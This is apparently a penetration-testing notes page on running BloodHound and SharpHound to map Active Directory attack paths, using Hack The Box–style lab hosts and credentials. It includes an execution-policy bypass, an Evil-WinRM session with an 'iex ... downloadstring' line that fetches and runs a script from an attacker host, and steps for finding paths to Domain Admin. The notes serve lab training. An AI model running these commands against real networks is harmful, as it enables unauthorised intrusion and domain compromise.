# BloodHound

## Run BloodHound remotely with python

```
sudo apt install bloodhound
sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-
BANK.LOCAL -ns 10.10.10.175 -c All
```



### **SharpHound**

{% code title="" overflow="wrap" lineNumbers="true" %}
```
iwr -uri http://192.168.45.242/SharpHound.ps1 -Outfile SharpHound.ps1 
powershell.exe -ep bypass
Import-Module .\SharpHound.ps1  
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit" 
```
{% endcode %}



With my shell, I’ll run [SharpHound ](https://github.com/BloodHoundAD/SharpHound/releases)to collect data for [BloodHound](https://github.com/BloodHoundAD/BloodHound). I’ve got a copy of Bloodhound on my machine (you can use `git clone https://github.com/BloodHoundAD/BloodHound.git` if you don’t). I’ll start a Python webserver in the `Ingestors` directory, and then load it in to my current session:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.16.12:8080/SharpHound.ps1")
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload /home/kali/tools/SharpHound.ps1
```

Now I’ll invoke it:

{% hint style="danger" %}
!!! invoke-bloodhound works only with the first command above. "iex"
{% endhint %}

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

The result is a zip file:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir


    Directory: C:\Users\svc-alfresco\appdata\local\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/8/2022   1:43 PM          15242 20220208134327_BloodHound.zip
-a----         2/8/2022   1:43 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin

```

## **Start/run BloodHound**

```
kali@kali:~$ sudo neo4j console

```

Log in at http://127.0.0.1:7474/ with username/password “neo4j”/"sameoldpass”

Run `bloodhound` from a new terminal window

Click on the “Upload Data” button

Under “Queries”, I’ll click “Find Shorter Paths to Domain Admin”. Select Pathfinding

![](<../../.gitbook/assets/image (22).png>)

###
